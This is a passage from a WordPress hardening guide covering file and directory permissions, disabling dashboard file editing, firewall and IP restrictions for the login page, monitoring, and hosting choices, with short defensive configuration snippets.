    - Use a strong, unique database password.
    - Restrict database user permissions to minimize risk.
- **Backup Regularly**:
    - Implement automatic backups with plugins like **UpdraftPlus** or **BackupBuddy**.

---

### **7. File and Directory Permissions**

- **Restrict File Permissions**:
    - Files: `644`
    - Directories: `755`
    - `wp-config.php`: `600`
- **Restrict File Editing**:
    - Disable file editing via the WordPress dashboard:
        
        ```php
        define( 'DISALLOW_FILE_EDIT', true );
        ```
        
- **Monitor File Changes**:
    - Use a security plugin to track changes in the file system.

---

### **8. Firewall and IP Restrictions**

- **Web Application Firewall (WAF)**:
    - Use a WAF provided by plugins like Wordfence or Sucuri.
- **IP Whitelisting**:
    - Limit access to sensitive pages like `/wp-admin` or `/wp-login.php` to specific IPs:
        
        ```
        <Files wp-login.php>
          Order Deny,Allow
          Deny from all
          Allow from 192.168.1.100
        </Files>
        ```
        

---

### **9. Monitoring and Incident Response**

- **Enable Logging**:
    - Enable server and WordPress logs to detect suspicious activity.
- **Set Up Alerts**:
    - Use plugins to receive real-time alerts for login attempts, file changes, or unusual traffic patterns.
- **Regular Security Audits**:
    - Periodically review the site's security posture using tools like WPScan or vulnerability scanners.

---

### **10. Hosting Security**

- **Choose a Secure Host**:
    - Use managed WordPress hosting providers like **Kinsta**, **WP Engine**, or **SiteGround**.
- **Isolate Accounts**:
    - Ensure the hosting environment isolates WordPress accounts to prevent cross-account vulnerabilities.

---

### **Summary**

By following these best practices, you can significantly improve the security of your WordPress site. Regular updates, proper user management, secure configurations, and the use of security plugins are key components of a robust WordPress hardening strategy.